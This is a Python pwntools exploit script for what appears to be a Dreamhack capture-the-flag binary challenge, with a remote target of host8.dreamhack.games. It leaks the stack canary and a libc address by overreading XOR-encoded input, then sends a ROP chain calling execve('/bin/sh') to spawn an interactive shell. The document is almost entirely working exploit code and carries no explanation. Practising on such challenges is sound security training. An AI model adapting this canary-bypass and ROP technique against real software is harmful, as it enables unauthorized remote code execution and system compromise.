#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 14229)
    return r

def encode_payload(data):
    arr = bytearray(data)
    for i in range(len(arr) - 2, -1, -1):
        arr[i] = arr[i] ^ arr[i + 1]
    return bytes(arr)

def main():
    r = conn()

    r.sendafter(b"Input: ", encode_payload(b"A" * 25))
    r.recvuntil(b"A" * 25)
    canary = b"\x00" + r.recvn(7)

    r.sendafter(b"Input: ", encode_payload(b"A" * 40))
    r.recvuntil(b"A" * 40)
    __libc_start_call_main = u64(r.recvn(6).ljust(8, b"\x00")) - 128
    
    libc.address = __libc_start_call_main - libc.symbols["__libc_start_call_main"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    execve = libc.symbols["execve"]

    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]

    payload = b"\x00" * 24
    payload += canary
    payload += b"B" * 8
    payload += p64(rdi_gadget)
    payload += p64(binsh)
    payload += p64(rsi_gadget)
    payload += p64(0)
    payload += p64(rdx_gadget)
    payload += p64(0)
    payload += p64(0)
    payload += p64(execve)

    r.sendafter(b"Input: ", encode_payload(payload))
    r.interactive()

if __name__ == "__main__":
    main()